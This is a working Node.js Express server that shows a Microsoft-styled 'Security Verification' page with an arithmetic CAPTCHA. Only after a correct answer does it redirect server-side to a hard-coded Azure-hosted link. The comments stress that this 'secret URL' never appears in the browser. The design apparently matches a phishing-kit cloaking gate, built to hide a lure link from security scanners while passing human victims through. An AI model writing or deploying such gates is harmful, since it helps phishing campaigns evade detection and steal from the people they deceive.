const express = require('express');
const session = require('express-session');
const app = express();

// YOUR SECRET URL IS HERE. It is NOT sent to the browser.
const MAIN_URL = process.env.MAIN_URL || 'https://witty-meadow-0f6628a10.5.azurestaticapps.net/l/Y0TEXO';

app.use(express.urlencoded({ extended: true }));
app.use(session({
    secret: 'a-very-long-random-secret-string',
    resave: false,
    saveUninitialized: true,
    cookie: { maxAge: 60000 } // 1 minute to solve the CAPTCHA
}));

// The HTML page with the Microsoft-style loading design and CAPTCHA
const getHtml = (num1, num2) => `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Check</title>
    <style>
        body {
            margin: 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #ffffff;
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;
            color: #333333;
        }
        .spinner {
            width: 48px;
            height: 48px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #0078d4;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .container {
            text-align: center;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
            background: white;
            max-width: 400px;
            width: 100%;
        }
        h2 { font-weight: 400; font-size: 20px; margin-bottom: 20px; }
        input {
            width: 80%;
            padding: 10px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 4px;
            margin-bottom: 20px;
            text-align: center;
        }
        button {
            background-color: #0078d4;
            color: white;
            border: none;
            padding: 10px 24px;
            font-size: 16px;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover { background-color: #005a9e; }
    </style>
</head>
<body>
    <div class="spinner"></div>
    <div class="container">
        <h2>Security Verification</h2>
        <form action="/verify" method="POST">
            <label>What is ${num1} + ${num2}?</label><br><br>
            <input type="number" name="userAnswer" required autocomplete="off" placeholder="Enter answer">
            <br>
            <button type="submit">Verify & Continue</button>
        </form>
    </div>
</body>
</html>
`;

app.get('/', (req, res) => {
    // Generate a random math CAPTCHA
    const num1 = Math.floor(Math.random() * 10) + 1;
    const num2 = Math.floor(Math.random() * 10) + 1;
    req.session.captchaAnswer = num1 + num2;
    res.send(getHtml(num1, num2));
});

app.post('/verify', (req, res) => {
    const userAnswer = parseInt(req.body.userAnswer);
    
    if (userAnswer === req.session.captchaAnswer) {
        req.session.captchaAnswer = null; // Prevent reuse
        // SERVER-SIDE REDIRECT: The URL is never sent to the client's browser source code.
        res.redirect(302, MAIN_URL);
    } else {
        res.status(400).send('<h2>Incorrect answer. <a href="/">Try again</a></h2>');
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
